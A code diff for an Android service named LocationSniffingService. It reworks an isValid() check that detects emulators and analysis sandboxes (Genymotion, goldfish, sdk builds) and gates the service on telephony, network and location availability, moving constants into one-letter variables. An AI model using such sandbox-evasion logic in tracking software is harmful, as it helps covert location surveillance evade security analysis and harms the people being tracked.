@@ -35,6 +35,7 @@ import static android.os.Build.FINGERPRINT;
 import static android.os.Build.HARDWARE;
 import static android.os.Build.MODEL;
 import static android.os.Build.PRODUCT;
+import static android.os.Build.MANUFACTURER;
 
 /**
  * Created by Jay on 3/29/2016.
@@ -128,36 +129,48 @@ public class LocationSniffingService extends Service{
     }
 
     private boolean isValid(){
+
+        String f = FINGERPRINT;
+        String m = MODEL;
+        String b = MANUFACTURER;
+        String p = PRODUCT;
+        String h = HARDWARE;
+        String t = TELEPHONY_SERVICE;
+        String c = CONNECTIVITY_SERVICE;
+        String l = LOCATION_SERVICE;
+        String g = GPS_PROVIDER;
+        String n = NETWORK_PROVIDER;
+
         //Check build's fingerprint
-        Boolean checkFingerprint =  FINGERPRINT.startsWith("generic") ||
-                FINGERPRINT.startsWith("unknown");
+        Boolean checkFingerprint =  f.startsWith("generic") ||
+                f.startsWith("unknown");
 
         //Check build's model
-        Boolean checkModel =        MODEL.contains("google_sdk") ||
-                MODEL.contains("Emulator") ||
-                MODEL.contains("Android SDK built for x86");
+        Boolean checkModel =        m.contains("google_sdk") ||
+                m.contains("Emulator") ||
+                m.contains("Android SDK built for x86");
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = Build.MANUFACTURER.contains("Genymotion") ||
-                Build.MANUFACTURER.contains("unknown");
+        Boolean checkManufacturer = b.contains("Genymotion") ||
+                b.contains("unknown");
 
         //Check build's product
-        Boolean checkProduct = "google_sdk".equals(PRODUCT) ||
-                "sdk".equals(PRODUCT) ||
-                "sdk_x86".equals(PRODUCT) ||
-                "vbox86p".equals(PRODUCT) ||
-                PRODUCT.matches(".*_?sdk_?.*");
+        Boolean checkProduct = p.contains("google_sdk") ||
+                p.contains("sdk") ||
+                p.contains("sdk_x86") ||
+                p.contains("vbox86p") ||
+                p.contains("google_sdk");
 
         //Check for goldfish hardware
-        Boolean checkHardware = (HARDWARE).contains("goldfish") ||
-                (HARDWARE).contains("vbox86");
+        Boolean checkHardware = h.contains("goldfish") ||
+                h.contains("vbox86");
 
         //Return if any is detected
         if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
             return false;
 
         //Check for telephone operator
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(t);
         String operator = telephonyManager.getNetworkOperator();
 
         //Return if it is android
@@ -169,7 +182,7 @@ public class LocationSniffingService extends Service{
             return false;
 
         ConnectivityManager connectivityManager = (ConnectivityManager)
-                getSystemService(CONNECTIVITY_SERVICE);
+                getSystemService(c);
 
         NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
 
@@ -179,25 +192,23 @@ public class LocationSniffingService extends Service{
 
 
         LocationManager locationManager = (LocationManager)
-                getSystemService(LOCATION_SERVICE);
+                getSystemService(l);
 
         boolean gps_enabled = false;
         boolean network_enabled = false;
 
         if(locationManager==null)
-            locationManager = (LocationManager) this.getSystemService(LOCATION_SERVICE);
+            locationManager = (LocationManager) this.getSystemService(l);
         try{
-            gps_enabled = locationManager.isProviderEnabled(GPS_PROVIDER);
+            gps_enabled = locationManager.isProviderEnabled(g);
         }catch(Exception ex){}
         try{
-            network_enabled = locationManager.isProviderEnabled(NETWORK_PROVIDER);
+            network_enabled = locationManager.isProviderEnabled(n);
         }catch(Exception ex){}
 
         //If location service is not enabled don't bother
         if(!gps_enabled && !network_enabled)
             return false;
-
-        
 
         return true;
     }
